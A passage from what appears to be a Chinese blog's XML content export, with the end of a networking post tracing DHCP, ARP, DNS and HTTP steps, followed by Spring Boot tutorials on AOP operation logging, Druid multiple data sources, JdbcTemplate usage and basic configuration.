请求报文，之后生成 DHCP ACK 报文，该报文包含以下信息：IP 地址、DNS 服务器的 IP 地址、默认网关路由器的 IP 地址和子网掩码。该报文被放入 UDP 报文段中，UDP 报文段有被放入 IP 数据报中，最后放入 MAC 帧中。 该帧的目的地址是请求主机的 MAC 地址，因为交换机具有自学习能力，之前主机发送了广播帧之后就记录了 MAC 地址到其转发接口的交换表项，因此现在交换机就可以直接知道应该向哪个接口发送该帧。 主机收到该帧后，不断分解得到 DHCP 报文。之后就配置它的 IP 地址、子网掩码和 DNS 服务器的 IP 地址，并在其 IP 转发表中安装默认网关。 2. ARP 解析 MAC 地址 主机通过浏览器生成一个 TCP 套接字，套接字向 HTTP 服务器发送 HTTP 请求。为了生成该套接字，主机需要知道网站的域名对应的 IP 地址。 主机生成一个 DNS 查询报文，该报文具有 53 号端口，因为 DNS 服务器的端口号是 53。 该 DNS 查询报文被放入目的地址为 DNS 服务器 IP 地址的 IP 数据报中。 该 IP 数据报被放入一个以太网帧中，该帧将发送到网关路由器。 DHCP 过程只知道网关路由器的 IP 地址，为了获取网关路由器的 MAC 地址，需要使用 ARP 协议。 主机生成一个包含目的地址为网关路由器 IP 地址的 ARP 查询报文，将该 ARP 查询报文放入一个具有广播目的地址（FF:FF:FF:FF:FF:FF）的以太网帧中，并向交换机发送该以太网帧，交换机将该帧转发给所有的连接设备，包括网关路由器。 网关路由器接收到该帧后，不断向上分解得到 ARP 报文，发现其中的 IP 地址与其接口的 IP 地址匹配，因此就发送一个 ARP 回答报文，包含了它的 MAC 地址，发回给主机。 3. DNS 解析域名 知道了网关路由器的 MAC 地址之后，就可以继续 DNS 的解析过程了。 网关路由器接收到包含 DNS 查询报文的以太网帧后，抽取出 IP 数据报，并根据转发表决定该 IP 数据报应该转发的路由器。 因为路由器具有内部网关协议（RIP、OSPF）和外部网关协议（BGP）这两种路由选择协议，因此路由表中已经配置了网关路由器到达 DNS 服务器的路由表项。 到达 DNS 服务器之后，DNS 服务器抽取出 DNS 查询报文，并在 DNS 数据库中查找待解析的域名。 找到 DNS 记录之后，发送 DNS 回答报文，将该回答报文放入 UDP 报文段中，然后放入 IP 数据报中，通过路由器反向转发回网关路由器，并经过以太网交换机到达主机。 4. HTTP 请求页面 有了 HTTP 服务器的 IP 地址之后，主机就能够生成 TCP 套接字，该套接字将用于向 Web 服务器发送 HTTP GET 报文。 在生成 TCP 套接字之前，必须先与 HTTP 服务器进行三次握手来建立连接。生成一个具有目的端口 80 的 TCP SYN 报文段，并向 HTTP 服务器发送该报文段。 HTTP 服务器收到该报文段之后，生成 TCP SYN ACK 报文段，发回给主机。 连接建立之后，浏览器生成 HTTP GET 报文，并交付给 HTTP 服务器。 HTTP 服务器从 TCP 套接字读取 HTTP GET 报文，生成一个 HTTP 响应报文，将 Web 页面内容放入报文主体中，发回给主机。 浏览器收到 HTTP 响应报文后，抽取出 Web 页面内容，之后进行渲染，显示 Web 页面。]]></content>
      <categories>
        <category>网络</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
        <tag>应用层</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[AOP记录用户操作日志]]></title>
    <url>%2F2018%2F05%2F13%2FAOP%E8%AE%B0%E5%BD%95%E7%94%A8%E6%88%B7%E6%93%8D%E4%BD%9C%E6%97%A5%E5%BF%97%2F</url>
    <content type="text"><![CDATA[在Spring框架中，使用AOP配合自定义注解可以方便的实现用户操作的监控。首先搭建一个基本的Spring Boot Web环境开启Spring Boot，然后引入必要依赖： 123456789101112131415161718192021222324&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-jdbc&lt;/artifactId&gt;&lt;/dependency&gt;&lt;!-- aop依赖 --&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-aop&lt;/artifactId&gt;&lt;/dependency&gt;&lt;!-- oracle驱动 --&gt;&lt;dependency&gt; &lt;groupId&gt;com.oracle&lt;/groupId&gt; &lt;artifactId&gt;ojdbc6&lt;/artifactId&gt; &lt;version&gt;6.0&lt;/version&gt;&lt;/dependency&gt;&lt;!-- druid数据源驱动 --&gt;&lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;1.1.6&lt;/version&gt;&lt;/dependency&gt; 自定义注解定义一个方法级别的@Log注解，用于标注需要监控的方法： 12345@Target(ElementType.METHOD)@Retention(RetentionPolicy.RUNTIME)public @interface Log &#123; String value() default &quot;&quot;;&#125; 创建库表和实体在数据库中创建一张sys_log表，用于保存用户的操作日志，数据库采用oracle 11g： 1234567891011121314151617181920CREATE TABLE &quot;SCOTT&quot;.&quot;SYS_LOG&quot; ( &quot;ID&quot; NUMBER(20) NOT NULL , &quot;USERNAME&quot; VARCHAR2(50 BYTE) NULL , &quot;OPERATION&quot; VARCHAR2(50 BYTE) NULL , &quot;TIME&quot; NUMBER(11) NULL , &quot;METHOD&quot; VARCHAR2(200 BYTE) NULL , &quot;PARAMS&quot; VARCHAR2(500 BYTE) NULL , &quot;IP&quot; VARCHAR2(64 BYTE) NULL , &quot;CREATE_TIME&quot; DATE NULL );COMMENT ON COLUMN &quot;SCOTT&quot;.&quot;SYS_LOG&quot;.&quot;USERNAME&quot; IS &apos;用户名&apos;;COMMENT ON COLUMN &quot;SCOTT&quot;.&quot;SYS_LOG&quot;.&quot;OPERATION&quot; IS &apos;用户操作&apos;;COMMENT ON COLUMN &quot;SCOTT&quot;.&quot;SYS_LOG&quot;.&quot;TIME&quot; IS &apos;响应时间&apos;;COMMENT ON COLUMN &quot;SCOTT&quot;.&quot;SYS_LOG&quot;.&quot;METHOD&quot; IS &apos;请求方法&apos;;COMMENT ON COLUMN &quot;SCOTT&quot;.&quot;SYS_LOG&quot;.&quot;PARAMS&quot; IS &apos;请求参数&apos;;COMMENT ON COLUMN &quot;SCOTT&quot;.&quot;SYS_LOG&quot;.&quot;IP&quot; IS &apos;IP地址&apos;;COMMENT ON COLUMN &quot;SCOTT&quot;.&quot;SYS_LOG&quot;.&quot;CREATE_TIME&quot; IS &apos;创建时间&apos;;CREATE SEQUENCE seq_sys_log START WITH 1 INCREMENT BY 1; 库表对应的实体： 1234567891011121314public class SysLog implements Serializable&#123; private static final long serialVersionUID = -6309732882044872298L; private Integer id; private String username; private String operation; private Integer time; private String method; private String params; private String ip; private Date createTime; // get,set略&#125; 保存日志的方法为了方便，这里直接使用Spring JdbcTemplate来操作数据库。定义一个SysLogDao接口，包含一个保存操作日志的抽象方法： 123public interface SysLogDao &#123; void saveSysLog(SysLog syslog);&#125; 其实现方法： 1234567891011121314151617@Repositorypublic class SysLogDaoImp implements SysLogDao &#123; @Autowired private JdbcTemplate jdbcTemplate; @Override public void saveSysLog(SysLog syslog) &#123; StringBuffer sql = new StringBuffer(&quot;insert into sys_log &quot;); sql.append(&quot;(id,username,operation,time,method,params,ip,create_time) &quot;); sql.append(&quot;values(seq_sys_log.nextval,:username,:operation,:time,:method,&quot;); sql.append(&quot;:params,:ip,:createTime)&quot;); NamedParameterJdbcTemplate npjt = new NamedParameterJdbcTemplate(this.jdbcTemplate.getDataSource()); npjt.update(sql.toString(), new BeanPropertySqlParameterSource(syslog)); &#125;&#125; 切面和切点定义一个LogAspect类，使用@Aspect标注让其成为一个切面，切点为使用@Log注解标注的方法，使用@Around环绕通知： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364@Aspect@Componentpublic class LogAspect &#123; @Autowired private SysLogDao sysLogDao; @Pointcut(&quot;@annotation(com.springboot.annotation.Log)&quot;) public void pointcut() &#123; &#125; @Around(&quot;pointcut()&quot;) public Object around(ProceedingJoinPoint point) &#123; Object result = null; long beginTime = System.currentTimeMillis(); try &#123; // 执行方法 result = point.proceed(); &#125; catch (Throwable e) &#123; e.printStackTrace(); &#125; // 执行时长(毫秒) long time = System.currentTimeMillis() - beginTime; // 保存日志 saveLog(point, time); return result; &#125; private void saveLog(ProceedingJoinPoint joinPoint, long time) &#123; MethodSignature signature = (MethodSignature) joinPoint.getSignature(); Method method = signature.getMethod(); SysLog sysLog = new SysLog(); Log logAnnotation = method.getAnnotation(Log.class); if (logAnnotation != null) &#123; // 注解上的描述 sysLog.setOperation(logAnnotation.value()); &#125; // 请求的方法名 String className = joinPoint.getTarget().getClass().getName(); String methodName = signature.getName(); sysLog.setMethod(className + &quot;.&quot; + methodName + &quot;()&quot;); // 请求的方法参数值 Object[] args = joinPoint.getArgs(); // 请求的方法参数名称 LocalVariableTableParameterNameDiscoverer u = new LocalVariableTableParameterNameDiscoverer(); String[] paramNames = u.getParameterNames(method); if (args != null &amp;&amp; paramNames != null) &#123; String params = &quot;&quot;; for (int i = 0; i &lt; args.length; i++) &#123; params += &quot; &quot; + paramNames[i] + &quot;: &quot; + args[i]; &#125; sysLog.setParams(params); &#125; // 获取request HttpServletRequest request = HttpContextUtils.getHttpServletRequest(); // 设置IP地址 sysLog.setIp(IPUtils.getIpAddr(request)); // 模拟一个用户名 sysLog.setUsername(&quot;mrbird&quot;); sysLog.setTime((int) time); sysLog.setCreateTime(new Date()); // 保存系统日志 sysLogDao.saveSysLog(sysLog); &#125;&#125; 测试TestController： 1234567891011121314151617@RestControllerpublic class TestController &#123; @Log(&quot;执行方法一&quot;) @GetMapping(&quot;/one&quot;) public void methodOne(String name) &#123; &#125; @Log(&quot;执行方法二&quot;) @GetMapping(&quot;/two&quot;) public void methodTwo() throws InterruptedException &#123; Thread.sleep(2000); &#125; @Log(&quot;执行方法三&quot;) @GetMapping(&quot;/three&quot;) public void methodThree(String name, String age) &#123; &#125;&#125; 最终项目目录如下图所示： 启动项目，分别访问： http://localhost:8080/web/one?name=KangKang http://localhost:8080/web/two http://localhost:8080/web/three?name=Mike&amp;age=25 查询数据库： 123456789101112SQL&gt; select * from sys_log order by id; ID USERNAME OPERATION TIME METHOD PARAMS IP CREATE_TIME---------- ---------- ---------- ---------- ------------------------------ ------------------------------ ---------- -------------- 11 mrbird 执行方法一 6 com.springboot.controller.Test name: KangKang 127.0.0.1 08-12月-17 Controller.methodOne() 12 mrbird 执行方法二 2000 com.springboot.controller.Test 127.0.0.1 08-12月-17 Controller.methodTwo() 13 mrbird 执行方法三 0 com.springboot.controller.Test name: Mike age: 25 127.0.0.1 08-12月-17 Controller.methodThree()]]></content>
      <categories>
        <category>springboot</category>
      </categories>
      <tags>
        <tag>AOP</tag>
        <tag>日志</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Springboot配置Druid多数据源]]></title>
    <url>%2F2018%2F05%2F13%2FSpringboot%E9%85%8D%E7%BD%AEDruid%E5%A4%9A%E6%95%B0%E6%8D%AE%E6%BA%90%2F</url>
    <content type="text"><![CDATA[回顾在Spring中配置MyBatis SqlSessionFactory的配置： 12345&lt;!-- mybatis 的SqlSessionFactory --&gt;&lt;bean id=&quot;sqlSessionFactory&quot; class=&quot;org.mybatis.spring.SqlSessionFactoryBean&quot; scope=&quot;prototype&quot;&gt; &lt;property name=&quot;dataSource&quot; ref=&quot;dataSource&quot;/&gt; &lt;property name=&quot;configLocation&quot; value=&quot;classpath:mybatis-config.xml&quot;/&gt;&lt;/bean&gt; 所以实际上在Spring Boot中配置MyBatis多数据源的关键在于创建SqlSessionFactory的时候为其分配不同的数据源。 引入依赖先开启一个最简单的Spring Boot应用，然后引入如下依赖： 12345678910111213141516171819202122232425&lt;dependency&gt; &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;1.3.1&lt;/version&gt;&lt;/dependency&gt;&lt;!-- oracle驱动 --&gt;&lt;dependency&gt; &lt;groupId&gt;com.oracle&lt;/groupId&gt; &lt;artifactId&gt;ojdbc6&lt;/artifactId&gt; &lt;version&gt;6.0&lt;/version&gt;&lt;/dependency&gt;&lt;!-- mysql驱动 --&gt;&lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;&lt;/dependency&gt;&lt;!-- druid数据源驱动 --&gt;&lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;1.1.6&lt;/version&gt;&lt;/dependency&gt; 多数据源配置在Spring Boot配置文件application.yml中配置多数据源。 然后根据application.yml创建两个数据源配置类MysqlDatasourceConfig和OracleDatasourceConfig： MysqlDatasourceConfig： 12345678910111213141516171819202122232425262728293031323334@Configuration@MapperScan(basePackages = MysqlDatasourceConfig.PACKAGE, sqlSessionFactoryRef = &quot;mysqlSqlSessionFactory&quot;)public class MysqlDatasourceConfig &#123; // mysqldao扫描路径 static final String PACKAGE = &quot;com.springboot.mysqldao&quot;; // mybatis mapper扫描路径 static final String MAPPER_LOCATION = &quot;classpath:mapper/mysql/*.xml&quot;; @Primary @Bean(name = &quot;mysqldatasource&quot;) @ConfigurationProperties(&quot;spring.datasource.druid.mysql&quot;) public DataSource mysqlDataSource() &#123; return DruidDataSourceBuilder.create().build(); &#125; @Bean(name = &quot;mysqlTransactionManager&quot;) @Primary public DataSourceTransactionManager mysqlTransactionManager() &#123; return new DataSourceTransactionManager(mysqlDataSource()); &#125; @Bean(name = &quot;mysqlSqlSessionFactory&quot;) @Primary public SqlSessionFactory mysqlSqlSessionFactory(@Qualifier(&quot;mysqldatasource&quot;) DataSource dataSource) throws Exception &#123; final SqlSessionFactoryBean sessionFactory = new SqlSessionFactoryBean(); sessionFactory.setDataSource(dataSource); //如果不使用xml的方式配置mapper，则可以省去下面这行mapper location的配置。 sessionFactory.setMapperLocations(new PathMatchingResourcePatternResolver() .getResources(MysqlDatasourceConfig.MAPPER_LOCATION)); return sessionFactory.getObject(); &#125;&#125; 上面代码配置了一个名为mysqldatasource的数据源，对应application.yml中spring.datasource.druid.mysql前缀配置的数据库。然后创建了一个名为mysqlSqlSessionFactory的Bean，并且注入了mysqldatasource。与此同时，还分别定了两个扫描路径PACKAGE和MAPPER_LOCATION，前者为Mysql数据库对应的mapper接口地址，后者为对应的mapper xml文件路径。 @Primary标志这个Bean如果在多个同类Bean候选时，该Bean优先被考虑。多数据源配置的时候，必须要有一个主数据源，用@Primary标志该Bean。 同理，接着配置Oracle数据库对应的配置类： OracleDatasourceConfig： 1234567891011121314151617181920212223242526272829303132@Configuration@MapperScan(basePackages = OracleDatasourceConfig.PACKAGE, sqlSessionFactoryRef = &quot;oracleSqlSessionFactory&quot;)public class OracleDatasourceConfig &#123; // oracledao扫描路径 static final String PACKAGE = &quot;com.springboot.oracledao&quot;; // mybatis mapper扫描路径 static final String MAPPER_LOCATION = &quot;classpath:mapper/oracle/*.xml&quot;; @Bean(name = &quot;oracledatasource&quot;) @ConfigurationProperties(&quot;spring.datasource.druid.oracle&quot;) public DataSource oracleDataSource() &#123; return DruidDataSourceBuilder.create().build(); &#125; @Bean(name = &quot;oracleTransactionManager&quot;) public DataSourceTransactionManager oracleTransactionManager() &#123; return new DataSourceTransactionManager(oracleDataSource()); &#125; @Bean(name = &quot;oracleSqlSessionFactory&quot;) public SqlSessionFactory oracleSqlSessionFactory(@Qualifier(&quot;oracledatasource&quot;) DataSource dataSource) throws Exception &#123; final SqlSessionFactoryBean sessionFactory = new SqlSessionFactoryBean(); sessionFactory.setDataSource(dataSource); //如果不使用xml的方式配置mapper，则可以省去下面这行mapper location的配置。 sessionFactory.setMapperLocations(new PathMatchingResourcePatternResolver() .getResources(OracleDatasourceConfig.MAPPER_LOCATION)); return sessionFactory.getObject(); &#125;&#125; 测试配置完多数据源，接下来分别在com.springboot.mysqldao路径和com.springboot.oracledao路径下创建两个mapper接口： MysqlStudentMapper： 12345678910package com.springboot.mysqldao;import java.util.List;import java.util.Map;import org.apache.ibatis.annotations.Mapper;@Mapperpublic interface MysqlStudentMapper &#123; List&lt;Map&lt;String, Object&gt;&gt; getAllStudents();&#125; OracleStudentMapper： 12345678910package com.springboot.oracledao;import java.util.List;import java.util.Map;import org.apache.ibatis.annotations.Mapper;@Mapperpublic interface OracleStudentMapper &#123; List&lt;Map&lt;String, Object&gt;&gt; getAllStudents();&#125; 接着创建mapper接口对应的实现： 在src/main/resource/mapper/mysql/路径下创建MysqlStudentMapper.xml： 12345678&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt; &lt;!DOCTYPE mapper PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot; &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt; &lt;mapper namespace=&quot;com.springboot.mysqldao.MysqlStudentMapper&quot;&gt; &lt;select id=&quot;getAllStudents&quot; resultType=&quot;java.util.Map&quot;&gt; select * from student &lt;/select&gt;&lt;/mapper&gt; 在src/main/resource/mapper/oracle/路径下创建OracleStudentMapper.xml： 12345678&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt; &lt;!DOCTYPE mapper PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot; &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt; &lt;mapper namespace=&quot;com.springboot.oracledao.OracleStudentMapper&quot;&gt; &lt;select id=&quot;getAllStudents&quot; resultType=&quot;java.util.Map&quot;&gt; select * from student &lt;/select&gt;&lt;/mapper&gt; Service，Controller以及测试数据同Spring Boot JdbcTemplate配置Druid多数据源，这里不再赘述。 最终项目目录如下图所示： 启动项目，访问：http://localhost:8080/web/querystudentsfrommysql： http://localhost:8080/web/querystudentsfromoracle：]]></content>
      <categories>
        <category>springboot</category>
      </categories>
      <tags>
        <tag>Druid</tag>
        <tag>数据源</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Springboot中使用JdbcTemplate]]></title>
    <url>%2F2018%2F05%2F11%2FSpringboot%E4%B8%AD%E4%BD%BF%E7%94%A8JdbcTemplate%2F</url>
    <content type="text"><![CDATA[个人觉得JdbcTemplate相较于MyBaits，Hibernate等数据库框架更容易上手，对SQL的操作也更为直观方便，所以在项目中也是一个不错的选择。在Spring Boot开启JdbcTemplate很简单，只需要引入spring-boot-starter-jdbc依赖即可。JdbcTemplate封装了许多SQL操作，具体可查阅官方文档https://docs.spring.io/spring/docs/current/javadoc-api/org/springframework/jdbc/core/JdbcTemplate.html。 引入依赖spring-boot-starter-jdbc： 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-jdbc&lt;/artifactId&gt;&lt;/dependency&gt; 数据库驱动为ojdbc6，数据源采用Druid。 代码编写数据准备： 123456789CREATE TABLE &quot;SCOTT&quot;.&quot;STUDENT&quot; ( &quot;SNO&quot; VARCHAR2(3 BYTE) NOT NULL , &quot;SNAME&quot; VARCHAR2(9 BYTE) NOT NULL , &quot;SSEX&quot; CHAR(2 BYTE) NOT NULL );INSERT INTO &quot;SCOTT&quot;.&quot;STUDENT&quot; VALUES (&apos;001&apos;, &apos;KangKang&apos;, &apos;M &apos;);INSERT INTO &quot;SCOTT&quot;.&quot;STUDENT&quot; VALUES (&apos;002&apos;, &apos;Mike&apos;, &apos;M &apos;);INSERT INTO &quot;SCOTT&quot;.&quot;STUDENT&quot; VALUES (&apos;003&apos;, &apos;Jane&apos;, &apos;F &apos;); 这里主要演示在Dao的实现类里使用JdbcTemplate，所以其它模块代码的编写就不展示了，具体可参考文末的源码。 StudentDaoImp类代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152@Repository(&quot;studentDao&quot;)public class StudentDaoImp implements StudentDao &#123; @Autowired private JdbcTemplate jdbcTemplate; @Override public int add(Student student) &#123; // String sql = &quot;insert into student(sno,sname,ssex) values(?,?,?)&quot;; // Object[] args = &#123; student.getSno(), student.getName(), student.getSex() &#125;; // int[] argTypes = &#123; Types.VARCHAR, Types.VARCHAR, Types.VARCHAR &#125;; // return this.jdbcTemplate.update(sql, args, argTypes); String sql = &quot;insert into student(sno,sname,ssex) values(:sno,:name,:sex)&quot;; NamedParameterJdbcTemplate npjt = new NamedParameterJdbcTemplate(this.jdbcTemplate.getDataSource()); return npjt.update(sql, new BeanPropertySqlParameterSource(student)); &#125; @Override public int update(Student student) &#123; String sql = &quot;update student set sname = ?,ssex = ? where sno = ?&quot;; Object[] args = &#123; student.getName(), student.getSex(), student.getSno() &#125;; int[] argTypes = &#123; Types.VARCHAR, Types.VARCHAR, Types.VARCHAR &#125;; return this.jdbcTemplate.update(sql, args, argTypes); &#125; @Override public int deleteBysno(String sno) &#123; String sql = &quot;delete from student where sno = ?&quot;; Object[] args = &#123; sno &#125;; int[] argTypes = &#123; Types.VARCHAR &#125;; return this.jdbcTemplate.update(sql, args, argTypes); &#125; @Override public List&lt;Map&lt;String, Object&gt;&gt; queryStudentsListMap() &#123; String sql = &quot;select * from student&quot;; return this.jdbcTemplate.queryForList(sql); &#125; @Override public Student queryStudentBySno(String sno) &#123; String sql = &quot;select * from student where sno = ?&quot;; Object[] args = &#123; sno &#125;; int[] argTypes = &#123; Types.VARCHAR &#125;; List&lt;Student&gt; studentList = this.jdbcTemplate.query(sql, args, argTypes, new StudentMapper()); if (studentList != null &amp;&amp; studentList.size() &gt; 0) &#123; return studentList.get(0); &#125; else &#123; return null; &#125; &#125;&#125; 在引入spring-boot-starter-jdbc驱动后，可直接在类中注入JdbcTemplate。由上面代码可发现，对于保存操作有两种不同的方法，当插入的表字段较多的情况下，推荐使用NamedParameterJdbcTemplate。 对于返回结果，可以直接使用List&lt;Map&lt;String, Object&gt;&gt;来接收，这也是个人比较推荐使用的方式，毕竟比较简单方便；也可以使用库表对应的实体对象来接收，不过这时候我们就需要手动创建一个实现了org.springframework.jdbc.core.RowMapper的对象，用于将实体对象属性和库表字段一一对应： 12345678910public class StudentMapper implements RowMapper&lt;Student&gt;&#123; @Override public Student mapRow(ResultSet rs, int rowNum) throws SQLException &#123; Student student = new Student(); student.setSno(rs.getString(&quot;sno&quot;)); student.setName(rs.getString(&quot;sname&quot;)); student.setSex(rs.getString(&quot;ssex&quot;)); return student; &#125;&#125; 测试最终项目目录如下图所示： 启动项目，测试插入数据http://localhost:8080/web/addstudent?sno=004&amp;name=Maria&amp;sex=F： 查询所有学生数据http://localhost:8080/web/queryallstudent: 测试删除http://localhost:8080/web/deletestudent?sno=004：]]></content>
      <categories>
        <category>springboot</category>
      </categories>
      <tags>
        <tag>Springboot整合</tag>
        <tag>JdbcTemplate</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Springboot基础配置]]></title>
    <url>%2F2018%2F05%2F03%2FSpringboot%E5%9F%BA%E7%A1%80%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[定制BannerSpring Boot项目在启动的时候会有一个默认的启动图案： 1234567 . ____ _ __ _ _ /\\ / ___&apos;_ __ _ _(_)_ __ __ _ \ \ \ \( ( )\___ | &apos;_ | &apos;_| | &apos;_ \/ _` | \ \ \ \ \\/ ___)| |_)| | | | | || (_| | ) ) ) ) &apos; |____| .__|_| |_|_| |_\__, | / / / / =========|_|==============|___/=/_/_/_/ :: Spring Boot :: (v1.5.9.RELEASE) 我们可以把这个图案修改为自己想要的。在src/main/resources目录下新建banner.txt文件，然后将自己的图案黏贴进去即可。ASCII图案可通过网站http://www.network-science.de/ascii/一键生成，比如输入mrbird生成图案后复制到banner.txt，启动项目，eclipse控制台输出如下： 12345678 _ _ _ _ _ _ / \ / \ / \ / \ / \ / \ ( m | r | b | i | r | d ) \_/ \_/ \_/ \_/ \_/ \_/ ...2017-08-12 10:11:25.952 INFO 7160 --- [main] o.s.j.e.a.AnnotationMBeanExporter : Registering beans for JMX exposure on startup2017-08-12 10:11:26.057 INFO 7160 --- [main] s.b.c.e.t.TomcatEmbeddedServletContainer : Tomcat started on port(s): 8080 (http)2017-08-12 10:11:26.064 INFO 7160 --- [main] com.springboot.demo.DemoApplication : Started DemoApplication in 3.933 seconds (JVM running for 4.241) banner也可以关闭，在main方法中： 12345public static void main(String[] args) &#123; SpringApplication app = new SpringApplication(DemoApplication.class); app.setBannerMode(Mode.OFF); app.run(args);&#125; 全局配置文件在src/main/resources目录下，Spring Boot提供了一个名为application.properties的全局配置文件，可对一些默认配置的配置值进行修改。 附：application.properties中可配置所有官方属性 自定义属性值Spring Boot允许我们在application.properties下自定义一些属性，比如： 12mrbird.blog.name=mrbird&apos;s blogmrbird.blog.title=Spring Boot 定义一个BlogProperties Bean，通过@Value(&quot;${属性名}&quot;)来加载配置文件中的属性值： 1234567891011@Componentpublic class BlogProperties &#123; @Value(&quot;$&#123;mrbird.blog.name&#125;&quot;) private String name; @Value(&quot;$&#123;mrbird.blog.title&#125;&quot;) private String title; // get,set略 &#125; 编写IndexController，注入该Bean： 12345678910@RestControllerpublic class IndexController &#123; @Autowired private BlogProperties blogProperties; @RequestMapping(&quot;/&quot;) String index() &#123; return blogProperties.getName()+&quot;——&quot;+blogProperties.getTitle(); &#125;&#125; 启动项目，访问http://localhost:8080，页面显示如下： 在属性非常多的情况下，也可以定义一个和配置文件对应的Bean： 123456@ConfigurationProperties(prefix=&quot;mrbird.blog&quot;)public class ConfigBean &#123; private String name; private String title; // get,set略&#125; 通过注解@ConfigurationProperties(prefix=&quot;mrbird.blog&quot;)指明了属性的通用前缀，通用前缀加属性名和配置文件的属性名一一对应。 除此之外还需在Spring Boot入口类加上注解@EnableConfigurationProperties({ConfigBean.class})来启用该配置： 12345678@SpringBootApplication@EnableConfigurationProperties(&#123;ConfigBean.class&#125;)public class Application &#123; public static void main(String[] args) &#123; SpringApplication.run(Application.class, args); &#125;&#125; 之后便可在IndexController中注入该Bean，并使用了： 12345678910@RestControllerpublic class IndexController &#123; @Autowired private ConfigBean configBean; @RequestMapping(&quot;/&quot;) String index() &#123; return configBean.getName()+&quot;——&quot;+configBean.getTitle(); &#125;&#125; 属性间的引用在application.properties配置文件中，各个属性可以相互引用，如下： 123mrbird.blog.name=mrbird&apos;s blogmrbird.blog.title=Spring Bootmrbird.blog.wholeTitle=$&#123;mrbird.blog.name&#125;--$&#123;mrbird.blog.title&#125; 自定义配置文件除了可以在application.properties里配置属性，我们还可以自定义一个配置文件。在src/main/resources目录下新建一个test.properties: 12test.name=KangKangtest.age=25 定义一个对应该配置文件的Bean： 123456789@Configuration@ConfigurationProperties(prefix=&quot;test&quot;)@PropertySource(&quot;classpath:test.properties&quot;)@Componentpublic class TestConfigBean &#123; private String name; private int age; // get,set略&#125; 注解@PropertySource(&quot;classpath:test.properties&quot;)指明了使用哪个配置文件。要使用该配置Bean，同样也需要在入口类里使用注解@EnableConfigurationProperties({TestConfigBean.class})来启用该配置。 通过命令行设置属性值在运行Spring Boot jar文件时，可以使用命令java -jar xxx.jar --server.port=8081来改变端口的值。这条命令等价于我们手动到application.properties中修改（如果没有这条属性的话就添加）server.port属性的值为8081。 如果不想项目的配置被命令行修改，可以在入口文件的main方法中进行如下设置： 12345public static void main(String[] args) &#123; SpringApplication app = new SpringApplication(Application.class); app.setAddCommandLineProperties(false); app.run(args);&#125; 使用xml配置虽然Spring Boot并不推荐我们继续使用xml配置，但如果出现不得不使用xml配置的情况，Spring Boot允许我们在入口类里通过注解@ImportResource({&quot;classpath:some-application.xml&quot;})来引入xml配置文件。 Profile配置Profile用来针对不同的环境下使用不同的配置文件，多环境配置文件必须以application-{profile}.properties的格式命，其中{profile}为环境标识。比如定义两个配置文件： application-dev.properties：开发环境 1server.port=8080 application-prod.properties：生产环境 1server.port=8081 至于哪个具体的配置文件会被加载，需要在application.properties文件中通过spring.profiles.active属性来设置，其值对应{profile}值。 如：spring.profiles.active=dev就会加载application-dev.properties配置文件内容。可以在运行jar文件的时候使用命令java -jar xxx.jar --spring.profiles.active={profile}切换不同的环境配置。]]></content>
      <categories>
        <category>springboot</category>
      </categories>
      <tags>
        <tag>springboot基础配置</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[开启SpringBoot]]></title>
    <url>%2F2018%2F05%2F01%2F%E5%BC%80%E5%90%AFSpringBoot%2F</url>
    <content type="text"><![CDATA[Spring Boot是在Spring框架上创建的一个全新的框架，其设计目的是简化Spring应用的搭建和开发过程。开启Spring Boot有许多种方法可供选择，这里仅介绍使用http://start.spring.io/来构建一个简单的Spring Boot项目。 生成项目文件访问http://start.spring.io/，页面显示如下： 这里选择以Maven构建，语言选择Java，Spring Boot版本为1.5.9。然后点击Switch to the full version，可看到更多的配置以及依赖选择： 在项目信息里选择以jar包的方式部署，Java版本为7。在页面的下方还可以选择诸多的依赖，这里仅选择web进行演示： 最后点击页面的generate project按钮生成项目文件。文件下载后是一个压缩包，进行解压然后使用eclipse以Maven项目的形式导入。导入后eclipse会自动编译项目并下载相应的依赖，项目目录如下所示： 简单演示项目根目录下生成了一个artifactId+Application命名规则的入口类，为了演示简单，不再新建控制器，直接在入口类中编写代码： 1234567891011121314151617181920package com.springboot.demo;import org.springframework.boot.SpringApplication;import org.springframework.boot.autoconfigure.SpringBootApplication;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RestController;@RestController@SpringBootApplicationpublic class DemoApplication &#123; @RequestMapping(&quot;/&quot;) String index() &#123; return &quot;hello spring boot&quot;; &#125; public static void main(String[] args) &#123; SpringApplication.run(DemoApplication.class, args); &#125;&#125; 然后右键点击DemoAppliction，选择run as → Java Application： 访问http://localhost:8080，页面显示如下： 打包发布 在eclipse中右击项目，选择run as → Maven build…，如下图所示： 在Goals中输入clean 